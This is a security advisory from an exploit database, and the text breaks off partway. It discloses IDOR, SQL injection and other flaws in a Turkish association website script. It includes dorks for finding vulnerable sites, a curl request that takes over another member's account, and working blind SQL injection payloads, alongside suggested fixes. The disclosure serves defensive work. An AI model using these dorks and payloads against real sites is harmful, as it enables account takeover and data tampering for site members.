---
title: Association Management Script - Multiple Vulnerabilities (IDOR, SQLi, Stored XSS)
url: https://cxsecurity.com/issue/WLB-2026060001
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2026-06-06
fetch_date: 2026-06-07T06:15:48.838706
---

# Association Management Script - Multiple Vulnerabilities (IDOR, SQLi, Stored XSS)

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Association Management Script - Multiple Vulnerabilities (IDOR, SQLi, Stored XSS)** **2026.06.06**  Credit:  **[Xasthur](https://cxsecurity.com/author/Xasthur/1/)**  Risk: **High**  Local: **No**  Remote: ****Yes****  CVE: **N/A**  CWE: **[CWE-89](https://cxsecurity.com/cwe/CWE-89 "Click to see CWE-89")**  **[**Dork:** inurl:anketarsiv.html inurl:haberler-1.html inurl:index.php?page=haberler](https://cxsecurity.com/dorks/)** | |

# Exploit Title: Association Web Script - Multiple Vulnerabilities
# Date: 06.06.2026
# Author: Xasthur
# Contact: https://t.me/seomarketing\_tr
# Vulnerability Type: IDOR / SQL Injection / Path Traversal / Stored XSS / Information Disclosure
# Risk Level: Critical
# Tested on: PHP / MySQL
========================================================================
[Multiple Vulnerabilities] Dernek Sitesi Script - IDOR, SQLi, Path Traversal, Stored XSS & Information Disclosure (Turkish Version)
========================================================================
## Açıklama
Bu belge, projede tespit edilen güvenlik açıklarının nasıl istismar edilebileceğini adım adım açıklar. Amaç, geliştiricinin bu açıkları kapatması ve penetrasyon testlerinde kullanılabilmesidir.
---
## 1. IDOR (Insecure Direct Object Reference) – Bilgi Güncelleme
\*\*Dosya:\*\* sistem/bilgiguncelle.php
### Açıklık
Sayfa, üyenin kendi bilgilerini güncellemesi için tasarlanmış; ancak güncelleme sorgusunda kullanılan id değeri doğrudan kullanıcıdan (form POST) alınıyor. Sunucu tarafında “bu id, oturum açan kullanıcıya mı ait?” kontrolü yapılmıyor.
- SELECT sorgusu doğru şekilde $\_SESSION["uyeid"] kullanıyor (sadece kendi kaydı çekiliyor).
- UPDATE sorgusunda ise $\_POST['id'] kullanılıyor; bu değer formdaki hidden input’tan geliyor ve istemci tarafında değiştirilebilir.
### İstismar Adımları
1. Geçerli bir üye hesabıyla giriş yap (rutbe = 5).
2. “Bilgi Güncelle” sayfasına git (örn. bilgiguncelle.html).
3. Tarayıcı geliştirici araçları (F12) ile formu incele; hidden input’u bul:
<input type="hidden" name="id" value="123">
Buradaki 123 sizin üye id’niz.
4. Bu değeri başka bir üyenin id’si ile değiştir (örn. 2, 5, 10).
5. Formu doldurup gönder (ad, tcno, telefon, eposta, yeni şifre vb.).
6. UPDATE sorgusu WHERE Id = ? ile gönderdiğiniz id’yi kullanacağı için o id’ye ait üyenin kaydı güncellenir.
Alternatif (curl ile):
curl -X POST "https://site.com/bilgiguncelle.html" \
-H "Cookie: PHPSESSID=OTURUM\_COOKIE" \
-d "uyeguncelle=uyeguncelle" \
-d "id=2" \
-d "adsoyad=Kurban Ad" \
-d "tcno=12345678901" \
-d "telefon=05551234567" \
-d "eposta=attack@test.com" \
-d "sifre=yeni\_sifre\_123" \
-d "durum=1"
Sonuç: Hedef üyenin adı, e-postası, şifresi ve diğer alanları sizin gönderdiğiniz değerlerle değişir. Bu da tam hesap ele geçirme ve yetkisiz veri değişikliği anlamına gelir.
### Önerilen Düzeltme
UPDATE’te id hiç kullanıcıdan alınmamalı; sadece oturumdaki id kullanılmalı:
$upt = $db->prepare("UPDATE uyeler SET adsoyad = ?, tcno = ?, ... WHERE Id = ?");
$upt->execute(array($adsoyad, $tcno, ..., $\_SESSION["uyeid"]));
Formdaki id hidden alanı ya kaldırılmalı ya da sadece görüntüleme amaçlı kullanılmalı; asla UPDATE’te kullanılmamalı.
---
## 2. SQL Injection (SQL Enjeksiyonu)
Parameter: eposta (GET)
Type: boolean-based blind
Title: AND boolean-based blind - WHERE or HAVING clause
Payload: eposta=test@test.com' AND 7903=7903 AND 'yHoJ'='yHoJ&isim=Test&sonuc=ok&sonuc2=ok
---
anketarsiv.html
---
Parameter: ipkontrol (POST)
Type: time-based blind
Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
Payload: ara=Oyla&cevapid=1&ipkontrol=1' AND (SELECT 1100 FROM (SELECT(SLEEP(5)))Dhtd) AND 'svtW'='svtW&soruid=1&puan=1
### 2.1 Haber sayacı – haber.php
\*\*Dosya:\*\* sistem/haber.php (satır 3)
$id = guvenlik($\_GET['id']);
$sql = $db->query("UPDATE haberler SET hit = hit+1 WHERE haberId = '$id' LIMIT 1");
$id doğrudan sorgu metnine ekleniyor. guvenlik() fonksiyonu tek tırnakları &#039; yapıyor, ancak ardından & karakteri siliniyor (str\_replace("&", "", $q)). Bu yüzden &#039; -> #039; olur ve veritabanı tarafında tek tırnak ile kaçış/comment davranışı oluşturulabilir.
İstismar örneği:
- Parametre: id=1&' OR '1'='1
- guvenlik sonrası elde edilen string ile sorgu, mantıksal olarak WHERE haberId = '1' OR '1'='1' gibi çalışabilecek hale gelebilir.
- Daha kontrollü deneme: id=1&' ile & silindikten sonra geriye kalan ' ile tırnak kapatılıp ek SQL eklenebilir.
Pratik test (örnek):
GET /haber-xxx-1.html veya ?id=1&' OR 1=1--
Sorgunun hata vermesi, farklı sonuç döndürmesi veya birden fazla satırı güncellemesi SQL enjeksiyonunun göstergesi olabilir.
Düzeltme: id mutlaka prepared statement ile kullanılmalı; query() ile string birleştirme kaldırılmalı:
$stmt = $db->prepare("UPDATE haberler SET hit = hit+1 WHERE haberId = ? LIMIT 1");
$stmt->execute([$id]);
---
### 2.2 LIMIT parametreleri – Sayfalama
\*\*Etkilenen dosyalar:\*\* galeri.php, galeri2.php, haberler.php, video.php, etkinlikler.php, videolar.php, yorumlar.php, kadro.php vb.
Örnek: sistem/galeri.php
$sayfa = guvenlik($\_GET['sayfa']);
// ...
$baslangic = $baslangic1 - $sayfalik\_kayit;
$sql = $db->query("SELECT \* FROM galeri ORDER BY Id DESC LIMIT $baslangic, $sayfalik\_kayit");
$sayfa kullanıcıdan geliyor; sayı beklenirken metin veya özel karakter verilirse:
- sayfa=1; DROP TABLE galeri;-- gibi bir değer, guvenlik ve PHP tip dönüşümü ile kısmen zararsız hale gelse bile, farklı payload’larla hata mesajı veya beklenmedik davranış elde edilebilir.
- Negatif veya çok büyük sayılar: sayfa=-1 veya sayfa=999999 ile LIMIT -30, 30 gibi geçersiz/yoğun sorgulara yol açılarak DoS riski oluşur.
Örnek: sistem/galeri2.php (satır 57)
$sql = $db->query("SELECT \* FROM galeri WHERE album = '$id' ORDER BY Id ASC LIMIT $baslangic, $sayfalik\_kayit");
Burada hem $id hem de $baslangic / $sayfalik\_kayit doğrudan sorguya giriyor; aynı mantıkla SQL enjeksiyon ve hata/DoS denemeleri yapılabilir.
Düzeltme: Tüm sayfalama ve filtre parametreleri için:
- Sayısal parametreler: (int)$sayfa, (int)$id or filter\_var(..., FILTER\_VALIDATE\_INT) kullanın.
- Sorgularda sadece prepared stat...